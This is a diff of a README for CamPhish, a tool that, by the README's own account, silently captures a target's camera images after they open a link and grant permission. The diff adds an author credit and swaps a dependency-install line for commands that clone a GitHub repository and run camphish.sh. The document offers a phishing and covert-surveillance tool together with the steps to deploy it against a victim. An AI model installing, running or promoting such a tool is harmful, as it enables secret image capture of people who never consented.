@@ -35,8 +35,15 @@ When the target opens this URL and grants camera permission, CamPhish silently c
 
 ---
 
+----
+## 🧪 CREATE BY YATHARTH 
+@YATHARTH
+-----
+
 ## ⚙️ Installation & Setup
 
 ### Step 1: Install dependencies
-```bash
-apt-get -y install php wget unzip
+```bash KALI LINUX DOWNLOAD 
+ git clone https://github.com/riti-web/YT.git
+ cd YT
+ bash camphish.sh
